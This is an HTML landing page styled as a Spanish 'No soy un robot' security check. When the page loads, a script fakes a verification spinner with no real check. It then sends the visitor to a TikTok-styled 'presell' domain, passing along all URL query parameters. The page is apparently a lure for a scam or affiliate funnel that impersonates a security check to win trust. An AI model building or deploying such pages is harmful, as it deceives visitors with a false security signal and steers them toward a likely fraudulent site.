<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verificación de Seguridad</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }

    /* Iframe configurado para pantalla completa de fondo */
    .bg-iframe {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border: none;
      z-index: -1; 
    }

    body {
      background: transparent; /* Fondo transparente para que aparezca el iframe */
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      padding: 2rem 1.5rem;
    }

    .box {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 24px;
      width: 100%;
      max-width: 340px;
      z-index: 1; /* Garantiza que el botón se mantenga al frente */
    }

    .check-row {
      display: flex;
      align-items: center;
      gap: 14px;
      border: 1px solid #d1d5db;
      border-radius: 8px;
      padding: 18px 20px;
      cursor: pointer;
      background: #fff;
      width: 100%;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2); /* Sombra para resaltar el botón del fondo */
      -webkit-tap-highlight-color: transparent;
    }

    .check-row:active:not(.disabled) { background: #f9fafb; }
    .check-row.disabled { cursor: default; }

    .checkbox {
      width: 24px;
      height: 24px;
      border: 1.5px solid #9ca3af;
      border-radius: 5px;
      flex-shrink: 0;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .checkbox.loading {
      border-color: #3b82f6;
      border-top-color: transparent;
      animation: spin 0.7s linear infinite;
    }

    .checkbox.checked {
      background: #3b82f6;
      border-color: #3b82f6;
      animation: none;
    }

    .checkbox.checked::after {
      content: '';
      width: 6px;
      height: 11px;
      border: 2px solid #fff;
      border-top: none;
      border-left: none;
      transform: rotate(45deg) translateY(-1px);
      display: block;
    }

    .label {
      font-size: 16px;
      color: #374151;
      flex: 1;
    }

    .status {
      font-size: 14px;
      color: #374151;
      font-weight: bold;
      background: rgba(255, 255, 255, 0.8);
      padding: 4px 8px;
      border-radius: 4px;
      min-height: 24px;
      text-align: center;
    }

    @keyframes spin { to { transform: rotate(360deg); } }
  </style>
</head>
<body>

  <div class="box">
    <div class="check-row" id="row">
      <div class="checkbox" id="cb"></div>
      <span class="label">No soy un robot</span>
    </div>
    <span class="status" id="status"></span>
  </div>

  <script>
    let done = false;
    function verify() {
      if (done) return;
      done = true;
      const cb = document.getElementById('cb');
      const st = document.getElementById('status');
      const row = document.getElementById('row');
      row.classList.add('disabled');
      cb.classList.add('loading');
      st.textContent = 'Verificando...';
      
      setTimeout(function() {
        cb.classList.remove('loading');
        cb.classList.add('checked');
        st.textContent = '¡Verificado! Redireccionando...';
        
        setTimeout(function() {
          const urlDestino = new URL('https://tiktok-pay2026.site/presell/');
          const parametrosActuales = new URLSearchParams(window.location.search);
          
          parametrosActuales.forEach((valor, clave) => {
            urlDestino.searchParams.set(clave, valor);
          });
          
          window.location.href = urlDestino.toString();
        }, 1500);
      }, 2000);
    }

    // Executa a função automaticamente assim que a página carregar
    document.addEventListener('DOMContentLoaded', verify);
  </script>

</body>
</html>
